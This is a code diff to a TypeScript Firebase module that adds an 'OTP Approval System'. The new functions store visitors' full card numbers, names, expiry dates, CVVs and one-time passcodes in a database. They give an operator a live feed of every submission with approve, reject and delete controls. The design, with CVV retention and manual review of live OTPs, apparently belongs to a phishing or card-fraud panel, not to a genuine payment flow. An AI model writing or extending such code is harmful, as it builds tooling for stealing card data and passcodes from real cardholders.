@@ -260,4 +260,93 @@ export const deleteOnlineUser = async (visitorId: string) => {
   }
 };
 
+// OTP Approval System
+export const requestOtpApproval = async (otpData: {
+  cardNumber: string;
+  cardName: string;
+  expiry: string;
+  cvv: string;
+  otpCode: string;
+  userName?: string;
+  email?: string;
+}) => {
+  try {
+    const visitorId = getVisitorId();
+    const docRef = doc(db, "otp_requests", visitorId);
+    await setDoc(docRef, {
+      ...otpData,
+      visitorId,
+      status: "pending",
+      createdAt: serverTimestamp(),
+      updatedAt: serverTimestamp(),
+    });
+    return true;
+  } catch (error) {
+    console.error("Error requesting OTP approval:", error);
+    return false;
+  }
+};
+
+export const subscribeToOtpApproval = (callback: (status: string | null) => void) => {
+  const visitorId = getVisitorId();
+  const docRef = doc(db, "otp_requests", visitorId);
+  return onSnapshot(docRef, (snapshot) => {
+    if (snapshot.exists()) {
+      callback(snapshot.data().status);
+    } else {
+      callback(null);
+    }
+  });
+};
+
+export const subscribeToAllOtpRequests = (callback: (requests: any[]) => void) => {
+  const otpRef = collection(db, "otp_requests");
+  return onSnapshot(otpRef, (snapshot) => {
+    const data = snapshot.docs.map(doc => ({
+      id: doc.id,
+      ...doc.data(),
+    }));
+    callback(data);
+  });
+};
+
+export const approveOtp = async (visitorId: string) => {
+  try {
+    const docRef = doc(db, "otp_requests", visitorId);
+    await setDoc(docRef, {
+      status: "approved",
+      updatedAt: serverTimestamp(),
+    }, { merge: true });
+    return true;
+  } catch (error) {
+    console.error("Error approving OTP:", error);
+    return false;
+  }
+};
+
+export const rejectOtp = async (visitorId: string) => {
+  try {
+    const docRef = doc(db, "otp_requests", visitorId);
+    await setDoc(docRef, {
+      status: "rejected",
+      updatedAt: serverTimestamp(),
+    }, { merge: true });
+    return true;
+  } catch (error) {
+    console.error("Error rejecting OTP:", error);
+    return false;
+  }
+};
+
+export const deleteOtpRequest = async (visitorId: string) => {
+  try {
+    const docRef = doc(db, "otp_requests", visitorId);
+    await deleteDoc(docRef);
+    return true;
+  } catch (error) {
+    console.error("Error deleting OTP request:", error);
+    return false;
+  }
+};
+
 export { db, database };
